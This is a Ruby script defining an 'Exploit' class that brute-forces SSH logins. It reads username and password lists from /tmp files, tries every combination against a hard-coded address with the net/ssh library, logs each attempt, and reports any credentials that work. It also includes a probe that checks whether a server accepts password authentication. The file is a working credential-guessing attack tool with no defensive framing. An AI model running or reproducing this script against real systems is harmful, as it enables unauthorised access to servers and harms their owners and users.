require 'net/ssh'
require 'timeout'
require "logger"

class Exploit
	def initialize(options)
		@logger = Logger.new("log_ssh.txt")
		@ip = options[:ip]
		@pass_queue = Queue.new
		@pass_array = options[:pass_array]
		@pass_array.each {|pass| @pass_queue.push pass}
		if @pass_queue.empty?
			puts "Error: pass queue is empty."
			exit
		end
	end

	def ssh_login(host, username, password)
		begin
			timeout(20) {
    		ssh = Net::SSH.start(host, username, :password => password, :number_of_password_prompts => 0)
    	}
	  rescue
	    return false
	  end
	  true
	end

	def distinguish_server
		begin
			timeout(10) {
				ssh = Net::SSH.start(@ip, "test"*8, :password => "te"*8, :number_of_password_prompts => 0)
			}
		rescue Net::SSH::AuthenticationFailed
			return true
		rescue
			return false
		end
		true
	end

	def verify
		until @pass_queue.empty?
			pass = @pass_queue.pop
			username = pass[:user]; password = pass[:pass]
			@logger.info("#{@ip} trying #{username}   ---  #{password}")
			# login
			if ssh_login(@ip, username, password)
				@logger.info("#{@ip} #{username}   ---  #{password} is login success!")
				return [true, "#{@ip} #{username} --- #{password} is login success!"] 
			end
		end
		false
	end

	def exploit
		puts "exploit"
	end
end


if __FILE__ == $0

	pass_array = []
	File.read("/tmp/username.txt").split("\n").each do |user|
		user = user.chomp
		next if user == "" or user.nil?
		File.read("/tmp/password.txt").split("\n").each do |pass|
			pass = pass.chomp
			next if pass == "" or pass.nil?
			pass_array << {user: user, pass: pass}
		end
	end

	ip = "192.168.0.1"
	exp = Exploit.new({ip: ip, pass_array: pass_array})
	flag, msg = exp.verify
	msg ||= ip
	puts msg if flag ==true
end
